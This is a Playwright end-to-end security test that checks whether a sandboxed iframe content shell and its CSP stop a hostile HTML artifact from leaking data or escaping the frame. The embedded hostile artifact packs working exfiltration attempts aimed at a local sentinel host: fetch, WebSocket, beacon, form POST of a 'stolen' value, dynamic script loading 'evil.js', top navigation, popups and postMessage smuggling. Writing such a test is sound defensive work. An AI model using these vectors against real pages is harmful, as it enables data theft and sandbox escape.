#!/usr/bin/env node
/**
 * Hostile-artifact sandbox egress suite (OWNER: WARDEN; Gate G5, plan §4/§5/§8).
 *
 * Proves, in a REAL browser against the REAL content shell under its REAL CSP,
 * that a maximally hostile `html-static` artifact:
 *   1. cannot exfiltrate over ANY channel — fetch / XHR / WebSocket / sendBeacon
 *      / EventSource / `<img>` / CSS `url()` background / `<form>` POST /
 *      `<link rel=prefetch|preload>` / dynamic `<script src>` — every request to
 *      a sentinel host must be ZERO (network-intercept-asserted);
 *   2. cannot escape the frame — no top navigation, no popup, no new browser
 *      page, parent URL unchanged;
 *   3. cannot smuggle content UP — a non-whitelisted message posted from inside
 *      the frame is counted as a tripwire reject by the parent host and never
 *      processed (the injected inline script DID run — CSP allows inline — so the
 *      block is the CSP/sandbox, not a failure to execute).
 *
 * The shell is exercised end-to-end: the parent posts a real `render` message
 * that passes the shell's exact-origin check (the shell is built with
 * NEXT_PUBLIC_APP_ORIGIN = this harness's parent origin), the shell injects the
 * HTML so inline scripts execute, and only THEN does CSP/sandbox stand between
 * the artifact and the network. The content CSP served here is the committed,
 * @hermes/policy-generated value from apps/content/vercel.json verbatim, except
 * `frame-ancestors` is retargeted to the local parent origin so the browser
 * permits the frame (every egress-relevant directive is byte-identical).
 *
 * Usage:  node e2e/security/hostile-artifacts.mjs
 *   Builds apps/content for the local origin if needed, or pass --no-build to
 *   reuse an existing out/ that was built for PARENT_ORIGIN.
 * Exit 0 iff every assertion passes.
 */

import { chromium } from "playwright-core";
import { createReadStream, existsSync, readFileSync, statSync } from "node:fs";
import { createServer } from "node:http";
import { spawnSync } from "node:child_process";
import { dirname, extname, join, normalize } from "node:path";
import { fileURLToPath } from "node:url";

const HERE = dirname(fileURLToPath(import.meta.url));
const REPO = join(HERE, "..", "..");
const CONTENT_OUT = join(REPO, "apps", "content", "out");
const CONTENT_VERCEL = join(REPO, "apps", "content", "vercel.json");

const PARENT_PORT = 4699;
const CONTENT_PORT = 4698;
const SENTINEL_PORT = 4697;
const PARENT_ORIGIN = `http://localhost:${PARENT_PORT}`;
const CONTENT_ORIGIN = `http://localhost:${CONTENT_PORT}`;
/**
 * Sentinel ORIGIN every exfil/escape attempt targets. This is a REAL local HTTP
 * server that records each hit. A CSP-blocked or sandbox-blocked attempt never
 * reaches the network, so it never hits this server — a recorded hit is therefore
 * unambiguous proof of egress (unlike Playwright's request event, which also
 * fires for CSP-blocked attempts that never leave the renderer).
 */
const SENTINEL = `localhost:${SENTINEL_PORT}`;

const CHROME_PATH =
  process.env.CHROME_PATH ?? "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";

const MIME = {
  ".html": "text/html; charset=utf-8",
  ".js": "text/javascript; charset=utf-8",
  ".css": "text/css; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".txt": "text/plain; charset=utf-8",
  ".svg": "image/svg+xml",
  ".ico": "image/x-icon",
};

const failures = [];
const passes = [];
function assert(cond, label, detail) {
  if (cond) passes.push(label);
  else failures.push(`${label}${detail ? ` — ${detail}` : ""}`);
}

/** The committed content CSP (policy-generated), with frame-ancestors retargeted. */
function contentHeaders() {
  const cfg = JSON.parse(readFileSync(CONTENT_VERCEL, "utf8"));
  const rule = (cfg.headers ?? []).find((h) => h.source === "/(.*)");
  if (!rule) throw new Error("no /(.*) header rule in apps/content/vercel.json");
  const map = {};
  for (const h of rule.headers) map[h.key.toLowerCase()] = h.value;
  const csp = map["content-security-policy"];
  // Retarget ONLY frame-ancestors to the local parent so the browser frames it;
  // every egress-relevant directive stays byte-identical to the policy.
  map["content-security-policy"] = csp.replace(
    /frame-ancestors [^;]+/,
    `frame-ancestors ${PARENT_ORIGIN}`,
  );
  return map;
}

function serveContent(headers) {
  return createServer((req, res) => {
    for (const [k, v] of Object.entries(headers)) res.setHeader(k, v);
    let urlPath = decodeURIComponent((req.url ?? "/").split("?")[0]);
    if (urlPath.endsWith("/")) urlPath += "index.html";
    const candidate = normalize(join(CONTENT_OUT, urlPath));
    if (!candidate.startsWith(CONTENT_OUT)) {
      res.statusCode = 403;
      res.end("forbidden");
      return;
    }
    if (existsSync(candidate) && statSync(candidate).isFile()) {
      res.statusCode = 200;
      res.setHeader("Content-Type", MIME[extname(candidate)] ?? "application/octet-stream");
      createReadStream(candidate).pipe(res);
    } else {
      res.statusCode = 404;
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      res.end("<!doctype html><title>404</title>not found");
    }
  });
}

/**
 * Parent "app-origin" page: mounts the shell sandboxed, runs the parent side of
 * the frame protocol (source-identity ready check, whitelist-only replies with
 * tripwire counting — mirrors apps/web htmlFrameHost), and exposes counters +
 * a render(html) hook for the test to drive.
 */
function parentPage() {
  return `<!doctype html><html><head><meta charset="utf-8"><title>host harness</title></head>
<body>
<iframe id="frame" src="${CONTENT_ORIGIN}/" sandbox="allow-scripts" referrerpolicy="no-referrer"
        style="width:600px;height:400px;border:0"></iframe>
<script>
  const iframe = document.getElementById('frame');
  const WHITELIST = new Set(['ready','height','render_error']);
  window.__state = { ready:false, rejected:0, renderError:null, heights:0, escapeError:null };
  function fromOurFrame(e){ return e.source && iframe.contentWindow && e.source === iframe.contentWindow; }
  window.addEventListener('message', (e) => {
    if (!fromOurFrame(e)) return;                 // foreign traffic — ignore
    const d = e.data;
    if (!d || typeof d !== 'object' || !WHITELIST.has(d.type)) { window.__state.rejected++; return; }
    if (d.type === 'ready') { window.__state.ready = true; }
    else if (d.type === 'height') { window.__state.heights++; }
    else if (d.type === 'render_error') { window.__state.renderError = String(d.message); }
  });
  // Opaque-origin recipient: "*" is the only deliverable target; identity was the
  // ready source check. Content only ever flows DOWN.
  window.__render = (html) => iframe.contentWindow.postMessage({ type:'render', html, artifactId:'hostile', seq:1 }, '*');
  window.top.__topUrl = location.href;
</script>
</body></html>`;
}

/** The maximally hostile artifact — every known exfil + escape vector at once. */
function hostileHtml() {
  const s = SENTINEL;
  return `
<h1>totally benign widget</h1>
<style>
  #bg { width:10px; height:10px; background-image:url("http://${s}/css-url.png"); }
  @font-face { font-family:x; src:url("http://${s}/font.woff2"); }
</style>
<div id="bg"></div>
<img id="beaconimg" src="http://${s}/img-tag.png" alt="">
<link rel="prefetch" href="http://${s}/prefetch">
<link rel="preload" as="image" href="http://${s}/preload">
<form id="f" method="POST" action="http://${s}/form-post"><input name="secret" value="stolen"></form>
<script>
  const S = "http://${s}";
  const tryeach = (label, fn) => { try { fn(); } catch (e) { /* CSP throws are fine */ } };
  tryeach('fetch', () => fetch(S + "/fetch", { mode:'no-cors' }));
  tryeach('xhr',   () => { const x = new XMLHttpRequest(); x.open('GET', S + "/xhr"); x.send(); });
  tryeach('ws',    () => { new WebSocket("ws://${s}/ws"); });
  tryeach('sse',   () => { new EventSource(S + "/sse"); });
  tryeach('beacon',() => { navigator.sendBeacon && navigator.sendBeacon(S + "/beacon", "x"); });
  tryeach('dynimg',() => { const i = new Image(); i.src = S + "/dyn-img.png"; });
  tryeach('dynscript', () => { const el = document.createElement('script'); el.src = S + "/evil.js"; document.body.appendChild(el); });
  tryeach('formsubmit', () => { document.getElementById('f').submit(); });
  // Escape attempts — sandbox has no allow-top-navigation / allow-popups.
  tryeach('topnav', () => { window.top.location = S + "/escape"; });
  tryeach('parentnav', () => { window.parent.location = S + "/escape2"; });
  tryeach('popup', () => { window.open(S + "/popup", "_blank"); });
  // Smuggle content UP as a non-whitelisted message (parent must reject+count).
  tryeach('smuggle', () => { window.parent.postMessage({ type:'steal', secret:'exfil' }, "*"); });
  tryeach('fakecontrol', () => { window.parent.postMessage({ type:'render', html:'<b>up</b>' }, "*"); });
</script>`;
}

async function main() {
  const noBuild = process.argv.includes("--no-build");
  if (!noBuild) {
    console.log(`▶ Building apps/content for ${PARENT_ORIGIN} …`);
    const r = spawnSync("pnpm", ["--filter", "@hermes/content", "build"], {
      cwd: REPO,
      stdio: "inherit",
      env: { ...process.env, NEXT_PUBLIC_APP_ORIGIN: PARENT_ORIGIN },
    });
    if (r.status !== 0) {
      console.error("✖ content build failed");
      process.exit(1);
    }
  }
  if (!existsSync(CONTENT_OUT)) {
    console.error(`✖ ${CONTENT_OUT} missing — build first`);
    process.exit(1);
  }

  // The sentinel server: any hit here is a real, network-level egress — a
  // CSP/sandbox-blocked attempt never reaches it. This is the ground truth.
  const egress = [];
  const sentinelServer = createServer((req, res) => {
    egress.push(`http ${req.url}`);
    res.statusCode = 204;
    res.end();
  });
  sentinelServer.on("upgrade", (req, socket) => {
    egress.push(`ws ${req.url}`); // WebSocket handshake reached us
    socket.destroy();
  });

  const contentServer = serveContent(contentHeaders());
  const parentServer = createServer((req, res) => {
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.end(parentPage());
  });
  await new Promise((r) => sentinelServer.listen(SENTINEL_PORT, r));
  await new Promise((r) => contentServer.listen(CONTENT_PORT, r));
  await new Promise((r) => parentServer.listen(PARENT_PORT, r));

  const browser = await chromium.launch({ executablePath: CHROME_PATH, headless: true });
  const context = await browser.newContext();

  // Any second page that navigates to a real URL = a popup/new-window escape. A
  // sandbox-blocked window.open yields no page (or an inert about:blank).
  const popups = [];
  context.on("page", (p) => {
    const u = p.url();
    if (u && u !== "about:blank") popups.push(u);
  });

  const page = await context.newPage();
  const cspViolations = [];
  page.on("console", (m) => {
    const t = m.text();
    if (/content security policy|refused to/i.test(t)) cspViolations.push(t);
  });

  try {
    await page.goto(PARENT_ORIGIN + "/", { waitUntil: "networkidle" });
    // Shell must announce ready (proves the real handshake ran).
    await page.waitForFunction(() => window.__state && window.__state.ready === true, { timeout: 15000 });
    assert(true, "content shell reached ready via the real protocol handshake");

    // Fire the hostile artifact and give every async attempt time to resolve.
    await page.evaluate((html) => window.__render(html), hostileHtml());
    await page.waitForTimeout(2500);

    const state = await page.evaluate(() => window.__state);

    assert(egress.length === 0, "ZERO network egress reached the sentinel server", egress.length ? `leaked: ${[...new Set(egress)].join(", ")}` : "");
    assert(popups.length === 0, "no popup / new-window escape to a real URL", popups.length ? `opened: ${popups.join(", ")}` : "");
    assert(page.url() === PARENT_ORIGIN + "/", "parent page did not navigate away", `url=${page.url()}`);
    assert(state.rejected >= 2, "parent counted the smuggled non-whitelisted messages as tripwire rejects", `rejected=${state.rejected}`);
    assert(state.renderError === null, "hostile artifact rendered without a shell error (inline script DID run, then was blocked)", state.renderError ?? "");
    // CSP actively refused at least some channels (evidence the policy is live).
    assert(cspViolations.length > 0, "browser reported CSP refusals (policy is enforced, not absent)", `violations=${cspViolations.length}`);
  } finally {
    await browser.close();
    contentServer.close();
    parentServer.close();
    sentinelServer.close();
  }

  for (const p of passes) console.log(`  ✓ ${p}`);
  if (failures.length > 0) {
    console.error(`\n✖ HOSTILE-ARTIFACT SUITE FAILED (${failures.length}):`);
    for (const f of failures) console.error(`  ✗ ${f}`);
    process.exit(1);
  }
  console.log(`\n✅ HOSTILE-ARTIFACT SUITE PASSED — ${passes.length} checks; ${[...new Set(egress)].length} egress leaks`);
}

main().catch((e) => {
  console.error(`✖ hostile-artifacts crashed: ${e instanceof Error ? e.stack : String(e)}`);
  process.exit(1);
});
